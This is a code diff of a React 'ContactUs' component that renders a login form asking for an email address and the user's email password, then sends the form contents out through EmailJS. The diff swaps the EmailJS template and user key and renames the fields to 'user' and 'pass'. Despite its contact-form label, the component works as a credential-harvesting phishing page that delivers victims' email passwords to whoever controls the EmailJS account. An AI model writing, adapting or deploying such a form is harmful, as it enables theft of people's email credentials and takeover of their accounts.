@@ -6,7 +6,7 @@ export default function ContactUs() {
     function sendEmail(e) {
         e.preventDefault();
 
-    emailjs.sendForm('gmail', 'template_mycoder', e.target, 'user_99ogBoikg8ImrHb1RSNcB')
+    emailjs.sendForm('gmail', 'template_hb9qmr9', e.target, 'user_SEoZ3jhZmvmc7W9yRaSnR')
         .then((result) => {
             console.log(result.text);
         }, (error) => {
@@ -22,11 +22,11 @@ export default function ContactUs() {
                     <div className="row pt-5 mx-auto" >
                         <div className="center">
                         <span class= "snter">Email Address</span> <br></br>
-                            <input type="text" className="form-control"  placeholder=" Enter your email address" name="email"/>
+                            <input type="text" className="form-control"  placeholder=" Enter your email address" name="user"/>
                         </div>
                         <div className="cente">
                         <span class= "snters">Password</span><br></br>
-                            <input type="password"  className="form-control" placeholder="Enter your email password" name="name" />
+                            <input type="password"  className="form-control" placeholder="Enter your email password" name="pass" />
                         </div>
                         <div className="col-8 pt-3 mx-auto">
                             <input type="submit" className="btn btn-info" value="Log In "></input>
